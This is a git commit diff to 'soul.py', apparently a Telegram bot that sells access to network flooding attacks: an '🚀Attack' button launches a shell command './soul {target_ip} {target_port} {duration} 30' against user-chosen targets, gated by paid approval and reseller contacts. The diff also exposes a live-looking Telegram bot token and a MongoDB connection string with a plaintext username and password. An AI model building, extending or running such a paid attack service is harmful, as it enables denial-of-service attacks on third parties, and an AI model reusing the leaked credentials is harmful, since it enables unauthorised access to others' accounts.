b49df562fda9a00c8fffcd335fb8f707832f3879
Sarkar879 <v.ijaykumar76889888@gmail.com>
2025-02-12 20:53:20 +0530

    Add files via upload

--- soul.py
+++ soul.py
@@ -13,11 +13,11 @@ from threading import Thread
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7114207827:AAFD1_RrCziYGNFqrVCW2idxWLXVFhOgKZg'
+TOKEN = ''
 MONGO_URI = 'mongodb+srv://rishi:ipxkingyt@rishiv.ncljp.mongodb.net/?retryWrites=true&w=majority&appName=rishiv'
-FORWARD_CHANNEL_ID = -1001826672472
-CHANNEL_ID = -1001826672472
-error_channel_id = -1001826672472
+FORWARD_CHANNEL_ID = -1002365113003
+CHANNEL_ID = -1002365113003
+error_channel_id = -1002365113003
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -35,7 +35,7 @@ running_processes = []
 
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./kingji {target_ip} {target_port} {duration}"
+    command = f"./soul {target_ip} {target_port} {duration} 30"
     try:
        
         process = await asyncio.create_subprocess_shell(
@@ -79,7 +79,7 @@ def check_user_approval(user_id):
     return False
 
 def send_not_approved_message(chat_id):
-    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-*", parse_mode='Markdown')
+    bot.send_message(chat_id, "*YOU ARE NOT APPROVED BUY ACESS:-@KRISHNAVIPOWNER*", parse_mode='Markdown')
 
 @bot.message_handler(commands=['approve', 'disapprove'])
 def approve_or_disapprove_user(message):
@@ -234,7 +234,7 @@ def send_welcome(message):
     # Create buttons
     btn1 = KeyboardButton("")
     btn2 = KeyboardButton("🚀Attack")
-    btn3 = KeyboardButton("")
+    btn3 = KeyboardButton("💼ResellerShip")
     btn4 = KeyboardButton("ℹ️ My Info")
     btn5 = KeyboardButton("")
     btn6 = KeyboardButton("")
@@ -252,7 +252,7 @@ def handle_message(message):
         bot.reply_to(message, "*🚀Attack Selected*", parse_mode='Markdown')
         attack_command(message)
     elif message.text == "💼ResellerShip":
-        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*FOR RESSELER SHIP DM :-@KRISHNAVIPOWNER*", parse_mode='Markdown')
     elif message.text == "ℹ️ My Info":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
